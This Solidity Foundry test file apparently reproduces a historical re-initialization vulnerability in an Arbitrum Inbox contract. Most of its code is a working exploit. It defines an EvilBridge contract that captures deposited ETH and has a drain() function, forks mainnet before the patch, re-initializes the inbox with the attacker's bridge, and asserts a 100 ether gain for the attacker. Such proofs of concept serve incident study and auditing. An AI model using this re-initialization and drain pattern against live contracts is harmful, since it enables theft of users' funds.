// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "forge-std/Test.sol";
import "forge-std/console.sol";

import {TestHarness} from "../../TestHarness.sol";
import {TokenBalanceTracker} from "../../modules/TokenBalanceTracker.sol";

interface IArbitrumInbox {
    function initialize(address _bridge, address _sequencerInbox) external;
    function depositEth() external payable;
}

contract EvilBridge {
    address public immutable owner;

    fallback() external payable {}
    receive() external payable {}

    constructor() {
        owner = msg.sender;
    }

    function enqueueDelayedMessage(uint8, address, bytes32) external payable returns (uint256) {
        console.log("Victim's value received: %s", msg.value);
        // returns silly fake message number
        return 9999;
    }

    function drain() external {
        payable(owner).transfer(address(this).balance);
    }
}

contract Report_ArbitrumInbox is TestHarness, TokenBalanceTracker {
    using stdStorage for StdStorage;

    address internal attacker = address(0xC8a65Fadf0e0dDAf421F28FEAb69Bf6E2E589963);
    IArbitrumInbox internal arbitrumInbox = IArbitrumInbox(0x4Dbd4fc535Ac27206064B68FfCf827b0A60BAB3f);
    //vulnerable implementation 0x3e2198a77fc6b266082b92859092170763548730
    EvilBridge evilBridge;

    function setUp() external {
        // The upgrade was activated at block 15447157 (I did a bisection over history with anvil + cast, was
        // not fun do not try)
        // By block 15460000 it was patched with no change in the implementation,
        // probably by re-initializing the contract and avoiding calling the postUpgradeInit method
        cheat.createSelectFork(vm.envString("RPC_URL"), 15_450_000); // fork number fairly arbitrary, just
        // when contract existed but before it was patched

        updateBalanceTracker(attacker);
        updateBalanceTracker(address(arbitrumInbox));
    }

    function test_attack() external {
        logBalancesWithLabel("Balances of attacker contract before:", attacker);
        uint256 balanceBefore = attacker.balance;

        cheat.startPrank(attacker);
        evilBridge = new EvilBridge();

        console.log("Attacker re-initializes bridge with their evil bridge.");
        arbitrumInbox.initialize(address(evilBridge), address(0x00));

        cheat.stopPrank();

        arbitrumInbox.depositEth{value: 100 ether}();
        evilBridge.drain();
        uint256 balanceAfter = attacker.balance;

        updateBalanceTracker(attacker);
        updateBalanceTracker(address(arbitrumInbox));
        logBalancesWithLabel("Balances of attacker contract after:", attacker);

        assertEq(balanceAfter - balanceBefore, 100 ether);
    }
}
